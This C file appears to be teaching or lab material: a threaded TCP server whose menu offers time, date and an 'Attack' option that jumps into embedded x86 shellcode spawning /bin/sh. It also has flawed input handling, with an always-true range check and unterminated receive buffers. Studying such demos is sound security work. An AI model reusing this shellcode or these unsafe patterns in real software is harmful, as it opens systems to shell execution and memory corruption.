/* The server */
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	BLENGTH	64

/* Simulate an attack */
static void
attack()
{
  char payload[] =
    "\xeb\x17\x5e\x31\xc0\x50\x56\x31"
    "\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd"
    "\x80\x31\xc0\xb0\xfc\x31\xdb\xcd"
    "\x80\xe8\xe4\xff\xff\xff\x2f\x62"
    "\x69\x6e\x2f\x73\x68";

  char *p = payload;

  asm("movl %0, %%eax; jmp *%%eax;"
      :
      :"r"(p)
      :"%eax"
      );
}

static int
read_command(int s)
{
  char *p = "Please select an option:\n1. Time\n2. Date\n3. Attack\n";
  char buffer[BLENGTH], response[BLENGTH];
  char *c;
  int x;

  /* Construct prompt */
  snprintf(buffer, sizeof (buffer), p);

  /* Prompt until valid response */
  for (;;) {

    /* Send prompt */
    send(s, (void *)buffer, sizeof (buffer), 0);

    /* Receive response */
    recv(s, (void *)response, sizeof (response), 0);

    /* Remove trailing '\n' */
    c = response + strlen(response) - 1;
    *c = '\0';

    /* Extract integer */
    x = strtol(response, NULL, 10);

    /* Done if valid */
    if (x >= 1 || x <= 3) {
      return (x);
    }
  }
}

static char *
execute_command(int s, unsigned int x)
{
  char buffer[BLENGTH];
  char answer[BLENGTH];
  struct tm *loctime;
  time_t curtime;

  /* Get the time/date */
  curtime = time(NULL);
  loctime = localtime(&curtime);

  /* Put time/date in buffer */
  if (x == 1) {
    strftime(answer, sizeof (answer), "The time is %I:%M %p\n", loctime);
  } else if (x == 2) {
    strftime(answer, sizeof (answer), "Today is %A, %B %d\n", loctime);
  } else {
    /* Attack */
    attack();
  }

  /* Append question */
  snprintf(buffer, sizeof (buffer), "%s%s", answer, "Continue? (Y/N)\n");
  
  /* Send to client */
  send(s, (void *)buffer, sizeof (buffer), 0);

  /* Receive reply */
  recv(s, (void *)buffer, sizeof (buffer), 0);

  /* Return reply */
  return strdup(buffer);
}

static void
handle_it(int s)
{
  unsigned int x;
  char *answer;
  
  for (;;) {

    /* Read command code from client */
    x = read_command(s);

    /* Execute the command */
   answer =  execute_command(s, x);

    /* Break if done */
    if (strcmp(answer, "Y\n")) {
      free(answer);
      break;
    }
    free(answer);
  }
  printf("Au revoir\n");
}

void *
handler(void *n)
{
  int s;

  /* Detach */
  pthread_detach(pthread_self());

  /* Cast */
  s = *((int *)n);

  /* Handle and then clean up */
  handle_it(s);
  close(s);
  free(n);

  return ((void *)NULL);
}

int
main(int argc, char *argv[])
{
  struct sockaddr_in socketname, client;
  struct hostent *host;
  socklen_t clientlen = sizeof (client);
  int s, n, *c, optval = 1;
  pthread_t tid;
  int port;

  /* Check usage */
  if (argc != 2) {
    printf("Usage: %s port\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  /* Retrieve port number */
  port = strtol(argv[1], NULL, 10);

  /* Retrieve localhost interface information */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&socketname, '\0', sizeof (socketname));
  socketname.sin_family = AF_INET;
  socketname.sin_port = htons(port);
  memcpy((char *)&socketname.sin_addr, host->h_addr_list[0], host->h_length);

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Allow address reuse if waiting on kernel to clean up */
  if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof (optval)) < 0) {
    perror("setsockopt()");
    exit(EXIT_FAILURE);
  }

  /* Bind address to socket */
  if (bind(s, (struct sockaddr *)&socketname, sizeof (socketname)) < 0) {
    perror("bind()");
    exit(EXIT_FAILURE);
  }

  /* Activate socket */
  if (listen(s, 5)) {
    perror("listen()");
    exit(EXIT_FAILURE);
  }

  /* Loop forever */
  for (;;) {

    /* Accept connection */
    n = accept(s, (struct sockaddr *)&client, &clientlen);
    if (n < 0) {
      perror("accept()");
      exit(EXIT_FAILURE);
    }

    /* Allocate memory for client socket */
    c = malloc(sizeof (*c));
    if (!c) {
      perror("malloc()");
      exit(EXIT_FAILURE);
    }
    *c = n;

    /* Create thread for this client */
    pthread_create(&tid, NULL, handler, (void *)c);		
  }

  /* Close socket */
  close(s);

  return (0);
}
